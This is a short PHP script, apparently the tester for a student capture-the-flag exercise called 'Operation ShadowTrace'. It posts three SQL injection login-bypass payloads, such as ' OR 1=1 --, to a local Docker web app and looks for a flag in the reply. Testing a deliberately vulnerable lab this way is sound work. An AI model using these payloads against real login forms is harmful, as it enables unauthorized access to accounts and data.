<?php
/**
 * Operation ShadowTrace - Stage 4 SQL Injection Tester
 * Member 4 - Integration & Testing (LO3)
 */

echo "[*] Stage 4 SQL Injection Tester\n";
echo "[*] Target: http://localhost:8080/index.php\n";
echo str_repeat("-", 40) . "\n";

$payloads = [
    ["username" => "' OR 1=1 --", "password" => "test"],
    ["username" => "affiliate' --", "password" => "test"],
    ["username" => "' OR '1'='1", "password" => "' OR '1'='1"],
];

foreach ($payloads as $i => $payload) {
    $num = $i + 1;
    echo "[+] Trying payload $num: {$payload['username']}\n";

    $ch = curl_init("http://localhost:8080/index.php");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($payload));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);

    $response = curl_exec($ch);
    $error = curl_error($ch);
    curl_close($ch);

    if ($error) {
        echo "[!] Connection error: $error\n";
        echo "[!] Is the container running? docker compose up -d\n";
        exit(1);
    }

    if (strpos($response, "SHADOW{web_") !== false || strpos($response, "Broker Admin Panel") !== false) {
        echo "[✓] SUCCESS – SQL Injection works!\n";
        echo "[✓] Payload: username = {$payload['username']}\n";

        if (preg_match('/SHADOW\{[^}]+\}/', $response, $matches)) {
            echo "[✓] Flag found: {$matches[0]}\n";
        }
        exit(0);
    } else {
        echo "[-] Failed with this payload\n";
    }
}

echo "[!] All payloads failed\n";
exit(1);
?>